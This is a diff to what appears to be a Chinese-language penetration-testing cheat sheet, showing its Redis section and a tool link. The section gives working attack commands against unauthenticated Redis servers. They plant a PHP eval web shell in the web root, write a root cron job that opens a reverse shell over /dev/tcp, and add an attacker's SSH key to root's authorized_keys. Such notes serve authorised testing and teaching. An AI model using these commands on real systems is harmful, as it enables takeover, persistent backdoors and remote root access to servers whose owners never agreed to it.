@@ -182,6 +182,8 @@ redis-cli -h $HOST -p $PORT
 CONFIG SET DIR /var/www/html
 CONFIG SET DBFILENAME exec.php
 SET crackit "\n\n\n\n<?php @eval($_REQUEST['exec']);?>\n\n\n\n"
+# SAVE 执行时会将所有数据快照以 RDB 文件的形式保存到硬盘
+SAVE
 # 写入计划任务
 CONFIG SET DIR /var/spool/cron
 CONFIG SET DBFILENAME root
@@ -192,7 +194,6 @@ CONFIG SET DBFILENAME reverse_shell
 SET crackit "\n\n\n\n* * * * * root bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
 # SAVE 执行时会将所有数据快照以 RDB 文件的形式保存到硬盘
 SAVE
-
 # 写入 SSH 公钥
 # ssh-keygen -t rsa
 (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/id_rsa.pub
@@ -203,6 +204,11 @@ CONFIG SET DIR /root/.ssh/
 CONFIG SET DBFILENAME "authorized_keys"
 SAVE
 ssh -i ~/.ssh/id_rsa root@HOST
+
+
+# UI Tools
+# https://goanother.com/cn/
+Another Redis Desktop Manager
 ```
 
 ## 8086 InfluxDB
